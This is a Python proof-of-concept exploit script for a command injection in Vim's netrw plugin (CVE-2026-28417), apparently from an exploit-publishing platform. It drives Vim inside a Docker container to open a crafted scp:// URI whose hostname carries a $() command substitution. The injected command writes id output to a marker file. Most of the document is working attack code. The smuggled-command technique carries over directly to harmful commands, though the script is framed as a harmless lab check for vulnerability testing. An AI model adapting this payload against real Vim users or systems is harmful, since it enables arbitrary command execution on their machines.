#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Vim netrw OS Command Injection — $() Substitution
# CVE            : CVE-2026-28417
# Vendor         : vim
# Product        : Vim
# Affected       : < v9.2.0073 (netrw plugin)
# Type           : CWE-78 - OS Command Injection
# CVSS           : 4.4 (Medium)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Vim netrw OS Command Injection — $() Command Substitution PoC

Demonstrates the SAME vulnerability but using $() command substitution
instead of semicolons. This proves the injection is not limited to
a single metacharacter class.

Payload: scp://a$(id>MARKER)b/dir/

Unlike the semicolon vector, this uses shell command substitution $(...),
which executes the enclosed command and substitutes its output inline.
The shell sees: ssh  a$(id>MARKER)b ls -FLa
And expands $(...) before executing ssh, running `id>MARKER` first.

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-28417
  - https://github.com/vim/vim/commit/79348dbbc09332130f4c86045e1541d68514fcc1
"""

import subprocess
import sys
import uuid

DEFAULT_CONTAINER = "cve-2026-28417-vulnerable"
MARKER = f"CVE-2026-28417-subshell-{uuid.uuid4().hex[:8]}"
WORKDIR = "/workspace"


def docker_exec(container: str, cmd: str, timeout: int = 30) -> tuple[int, str, str]:
    full_cmd = ["docker", "exec", container, "bash", "-c", cmd]
    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"


def check_container(container: str) -> bool:
    result = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", container],
        capture_output=True, text=True,
    )
    return result.returncode == 0 and "true" in result.stdout.strip()


def exploit_subshell_injection(container: str, marker: str) -> bool:
    """
    Command substitution injection via $() syntax.

    Payload: scp://a$(id>MARKER)b/dir/

    netrw extracts hostname 'a$(id>MARKER)b'. MakeSshCmd constructs:
        ssh  a$(id>MARKER)b ls -FLa
    Before executing 'ssh', the shell expands $() first:
        1. Runs: id>MARKER (writes uid info to file)
        2. Substitutes output (empty since redirected) into: ssh  ab ls -FLa
        3. ssh ab fails (irrelevant)
    """
    print(f"[*] Payload: scp://a$(id>{marker})b/dir/")
    print(f"[*] Expected shell expansion: ssh  a$(id>{marker})b ls -FLa")
    print()

    # Clean up
    docker_exec(container, f"rm -f {WORKDIR}/{marker}")

    # The $() must be carefully escaped through multiple shell layers:
    # - Python subprocess passes to Docker exec
    # - Docker exec passes to bash -c
    # - bash -c runs vim, which passes the URI to netrw
    # - netrw's MakeSshCmd substitutes hostname into shell command
    # - Vim's system() passes the final string to /bin/sh
    #
    # We need the $() to survive until Vim's system() call.
    # Using single quotes in the vim -c argument protects from the
    # container's bash, and netrw processes the raw URI string.
    vim_cmd = (
        f"cd {WORKDIR} && "
        f"timeout 20 vim --clean "
        f"-c 'packadd netrw' "
        f'-c \'e scp://a$(id>{marker})b/dir/\' '
        f"-c 'qa!' "
        f"</dev/null >/dev/null 2>&1 || true"
    )
    print("[*] Executing Vim with $() command substitution payload...")
    docker_exec(container, vim_cmd, timeout=30)

    # Check marker
    rc, stdout, _ = docker_exec(container, f"cat {WORKDIR}/{marker} 2>/dev/null")
    if rc == 0 and stdout.strip():
        print(f"[+] VULNERABLE! Marker file created with contents:")
        print(f"    {stdout.strip()}")
        return True
    else:
        print(f"[-] Marker file not found — this vector may have failed")
        return False


def main():
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER

    print("=" * 70)
    print(f"  CVE-2026-28417 — Vector 2: $() Command Substitution Injection")
    print("=" * 70)
    print()
    print(f"  Target: {container}")
    print(f"  Marker: {MARKER}")
    print()

    if not check_container(container):
        print(f"[-] FATAL: Container '{container}' is not running.")
        sys.exit(1)
    print(f"[+] Container is running.")
    print()

    print("[*] Executing $() command substitution injection...")
    print("-" * 50)
    success = exploit_subshell_injection(container, MARKER)
    print("-" * 50)
    print()

    if success:
        print("[+] RESULT: VULNERABLE — $() command substitution injection confirmed")
        docker_exec(container, f"rm -f {WORKDIR}/{MARKER}")
    else:
        print("[-] RESULT: This vector did not succeed (see notes)")
    print()

    # Cleanup
    docker_exec(container, f"rm -f {WORKDIR}/{MARKER}")
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
